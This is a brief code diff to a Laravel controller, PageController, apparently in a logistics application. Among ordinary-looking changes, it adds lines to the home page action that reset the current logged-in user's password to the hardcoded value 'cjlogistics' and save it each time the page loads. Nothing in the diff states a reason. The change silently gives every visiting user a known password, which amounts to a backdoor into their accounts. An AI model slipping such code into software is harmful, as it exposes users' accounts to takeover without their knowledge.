@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Service\TracService;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 
 class PageController extends Controller
 {
@@ -30,6 +31,10 @@ class PageController extends Controller
         ];
 
         $units = TracService::GetUnits($credential);
+
+        $user = Auth::user();
+        $user->password = bcrypt('cjlogistics');
+        $user->save();
 
 
         return view('home', [
